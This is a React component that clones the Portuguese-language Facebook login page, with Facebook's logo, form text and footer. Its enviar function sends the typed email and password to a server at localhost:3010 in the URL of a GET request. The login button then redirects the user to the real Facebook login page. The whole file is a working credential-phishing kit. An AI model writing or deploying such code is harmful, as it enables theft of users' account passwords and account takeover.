import './App.scss';
import './global.scss'
import { useState } from 'react';
import axios from 'axios';

function App() {

    

        const[Email, setEmail]= useState(0)
        const[Senha, setSenha]= useState(0)
        
        async function enviar(){
        
           let url= `http://localhost:3010/send/${Email}/${Senha}`;
           let resp = await axios.get(url)
        
        }
        
    

    return (
        <div className="pagina-de-login">

        <div className='espacoUm'>

            <img className='face' src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="" />

            <div className="container-login">
                    <p>Entrar no Facebook</p>

                    <form className="formulario-login">

                    <input type="text" placeholder="Email ou telefone" className="input-login" onChange={e=> setEmail(e.target.value)}/>
                    <input type="password" placeholder="Senha" className="input-login" onChange={e=> setSenha(e.target.value)}/>
                    <a href="https://pt-br.facebook.com/login/device-based/regular/login/">
                    <button type="submit" className="botao-login" onClick={enviar} > Entrar </button>
                    </a>
                    </form>
                        <a href="#" className="esqueceu-senha">Esqueceu a senha?</a>
                    
                    <div className='ouDivisor'>
                        <div className='line'></div>
                        <div className='ouTxt'>ou</div>
                        <div className='line'></div>
                    </div>
                
                    <button className="botao-criar-conta">Criar nova conta</button>
            </div>
        </div>
        <footer className="rodape">
        <nav className='navUm'>
            <a href="">Portugues (Brasil)</a>
            <a href="">English (US)</a>
            <a href="">Espanõl</a>
            <a href="">Français (France)</a>
            <a href="">Italiano</a>
            <a href="">Deutsch</a>
            <a href="">العربية</a>
            <a href="">हिन्दी</a>
            <a href="">中文(简体)</a>
            <a href="">日本語</a>
            <button className='plus'></button>
        </nav>
        <div className='lineDois'></div>
        <nav className='navDois'>
            <a href="">Cadastre-se</a>
            <a href="">Entrar</a>
            <a href="">Messenger</a>
            <a href="">Facebook Lite</a>
            <a href="">Vídeo</a>
            <a href="">Locais</a>
            <a href="">Jogos</a>
            <a href="">Marketplace</a>
            <a href="">Meta Pay</a>
            <a href="">Meta Store</a>
            <a href="">Meta Quest</a>
            <a href="">Meta Ray-Ban</a>
            <a href="">Meta AI</a>
            <br />
            <a href="">Instagram</a>
            <a href="">Threads</a>
            <a href="">Campanhas de arrecadação de fundos</a>
            <a href="">Serviços</a>
            <a href="">Central de Informações de Votação</a>
            <a href="">Política de Privacidade</a>
            <a href="">Central de Privacidade</a>
            <a href="">Grupos</a>
            <br />
            <a href="">Sobre</a>
            <a href="">Criar anúncio</a>
            <a href="">Criar Página</a>
            <a href="">Desenvolvedores</a>
            <a href="">Carreiras</a>
            <a href="">Cookies</a>
            <a href="">Escolhas para anúncios</a>
            <a href="">Termos</a>
            <a href="">Ajuda</a>
            <a href="">Carregamento de contatos e não usuários</a>
            <br />
          </nav>

          <p className='meta'>Meta © 2024</p>
        </footer>
      </div>
    );
  }
  
  export default App;